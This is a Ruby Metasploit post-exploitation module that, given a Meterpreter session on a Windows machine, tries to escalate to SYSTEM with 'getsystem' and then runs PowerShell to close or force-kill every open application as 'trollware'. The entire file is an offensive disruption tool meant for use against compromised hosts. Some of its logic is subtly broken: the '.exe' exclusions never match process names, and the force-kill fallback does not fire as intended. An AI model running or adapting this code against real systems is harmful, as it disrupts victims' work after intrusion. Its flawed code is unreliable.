# Module: post/windows/manage/close_all_apps
# Description: Closes all open GUI applications on the target Windows desktop as a trollware inconvenience.
# Requires a Meterpreter session. Uses PowerShell to enumerate and close windows gracefully where possible.

require 'msf/core/post/windows/powershell'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Close All Open Applications',
      'Description'   => 'Trollware module to close every open GUI application on the desktop, forcing the user to reopen them.',
      'License'       => MSF_LICENSE,
      'Author'        => ['idk'],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter']
    ))

    register_options(
      [
        OptBool.new('FORCE_KILL', [false, 'Force kill processes if graceful close fails', false]),
        OptString.new('EXCLUDE_APPS', [false, 'Comma-separated list of process names to exclude (e.g., explorer.exe,regedit.exe)', 'explorer.exe,taskmgr.exe'])
      ]
    )
  end

  def run
    if session.type != 'meterpreter'
      print_error('This module requires a Meterpreter session.')
      return
    end

    # Escalate if needed
    if session.sys.config.getuid != 'NT AUTHORITY\SYSTEM'
      print_status('Attempting to escalate...')
      session.run_cmd('getsystem') rescue nil
    end

    exclude_list = datastore['EXCLUDE_APPS'].split(',').map(&:strip) if datastore['EXCLUDE_APPS']

    print_status('Preparing to close open applications...')

    # Use PowerShell to get all processes with main windows and close them
    ps_script = <<~PSH
      Add-Type -AssemblyName UIAutomationClient
      $processes = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 -and $_.MainWindowTitle -ne '' }
      foreach ($proc in $processes) {
        if (#{exclude_list ? "'#{exclude_list.join("','")}' -notcontains $proc.ProcessName" : '$true'}) {
          try {
            $proc.CloseMainWindow() | Out-Null
          } catch {
            #{datastore['FORCE_KILL'] ? 'Stop-Process -Id $proc.Id -Force' : '# Graceful close failed, skipping'}
          }
        }
      }
    PSH

    print_status('Executing PowerShell script to close apps...')
    execute_script(ps_script, {})

    print_good('Applications closed. Blue team will have to reopen them!')
  end
end
